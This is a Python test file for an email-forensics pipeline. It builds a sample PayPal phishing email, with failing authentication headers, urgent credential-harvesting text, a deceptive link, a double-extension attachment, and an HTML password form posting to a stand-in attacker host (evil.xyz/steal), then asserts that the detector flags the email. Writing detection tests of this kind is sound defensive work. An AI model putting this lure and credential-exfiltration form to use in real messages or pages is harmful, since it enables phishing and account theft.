"""test_pipeline.py — smoke-test for the forensics pipeline."""
import sys, os
sys.path.insert(0, '.')

CRLF = "\r\n"

# Build proper RFC-5322 multipart email
header_lines = [
    "From: PayPal Support <security@paypal-verify-account.tk>",
    "To: victim@example.com",
    "Reply-To: harvester@evil-domain.xyz",
    "Subject: URGENT: Your PayPal account will be suspended within 24 hours",
    "Date: Mon, 01 Jan 2024 09:00:00 +0000",
    "MIME-Version: 1.0",
    "DKIM-Signature: v=1; a=rsa-sha256; d=paypal-verify-account.tk; s=default",
    "Received-SPF: fail (domain of paypal-verify-account.tk does not designate)",
    "Authentication-Results: mx.example.com; spf=fail; dkim=fail; dmarc=fail",
    'Content-Type: multipart/mixed; boundary="b"',
]
# Headers block + mandatory blank separator line
header_block = CRLF.join(header_lines) + CRLF + CRLF

plain_part = CRLF.join([
    "--b",
    "Content-Type: text/plain; charset=utf-8",
    "",
    "URGENT: Your PayPal account will be suspended within 24 hours!",
    "Act immediately. Click here to verify: http://192.168.1.100/login",
    "Enter your password and confirm your credit card details.",
    "",
])

html_part = CRLF.join([
    "--b",
    "Content-Type: text/html; charset=utf-8",
    "",
    "<html><body>",
    '<p>Click <a href="http://paypal-secure.verify-account.xyz/login">http://paypal.com</a></p>',
    '<form action="http://evil.xyz/steal"><input type="password" name="pass"></form>',
    "</body></html>",
    "",
])

attach_part = CRLF.join([
    "--b",
    "Content-Type: application/octet-stream",
    'Content-Disposition: attachment; filename="invoice.pdf.exe"',
    "",
    "FAKEPAYLOAD",
    "",
    "--b--",
    "",
])

sample_eml = header_block + plain_part + html_part + attach_part

os.makedirs('uploads', exist_ok=True)
test_path = 'uploads/test_phishing.eml'
# Write as binary to prevent Windows text mode from double-converting \r\n → \r\r\n
with open(test_path, 'wb') as f:
    f.write(sample_eml.encode('utf-8'))

from forensics import (parse_email, analyze_auth, extract_and_analyze_urls,
                       detect_phishing_indicators, analyze_attachments, calculate_risk)

parsed      = parse_email(test_path)
auth        = analyze_auth(parsed['headers'])
urls        = extract_and_analyze_urls(parsed['plain_body'], parsed['html_body'], parsed['headers'])
indicators  = detect_phishing_indicators(parsed['plain_body'], parsed['html_body'],
                                         parsed['headers'], parsed['from_addr'], parsed['reply_to'])
attachments = analyze_attachments(parsed['attachments'])
risk        = calculate_risk(auth, urls, indicators, attachments)

print(f"From       : {parsed['from_addr']}")
print(f"Subject    : {parsed['subject']}")
print(f"SPF        : {auth['spf']['result']}")
print(f"DKIM       : {auth['dkim']['result']}")
print(f"DMARC      : {auth['dmarc']['result']}")
sus = sum(1 for u in urls if u['is_suspicious'])
print(f"URLs       : {len(urls)} extracted, {sus} suspicious")
print(f"Indicators : {len(indicators)}")
for ind in indicators:
    print(f"  [{ind['severity'].upper()}] {ind['indicator_type']}")
print(f"Attachments: {len(attachments)}")
for att in attachments:
    status = "DANGEROUS" if att['is_dangerous'] else "SUSPICIOUS" if att['is_suspicious'] else "OK"
    print(f"  {status}: {att['filename']}")
print(f"Risk Score : {risk['score']} / 100  ({risk['level']})")
print()
print("Score Breakdown:")
for b in risk['breakdown']:
    print(f"  +{b['points']:>3} -- {b['label']}")

# Validate expected results
assert parsed['subject'] != '(No Subject)', f"Subject not parsed: {parsed['subject']}"
assert auth['spf']['result'] == 'fail',  f"SPF should be fail, got: {auth['spf']['result']}"
assert auth['dkim']['result'] == 'fail', f"DKIM should be fail, got: {auth['dkim']['result']}"
assert auth['dmarc']['result'] == 'fail', f"DMARC should be fail, got: {auth['dmarc']['result']}"
assert sus >= 2, f"Expected >=2 suspicious URLs, got {sus}"
assert len(indicators) >= 3, f"Expected >=3 indicators, got {len(indicators)}"
assert len(attachments) == 1, f"Expected 1 attachment, got {len(attachments)}"
assert attachments[0]['is_dangerous'], "Attachment should be flagged dangerous"
assert risk['level'] == 'High', f"Risk level should be High, got: {risk['level']}"

os.remove(test_path)
print()
print("All assertions passed.")
print("Pipeline test PASSED.")
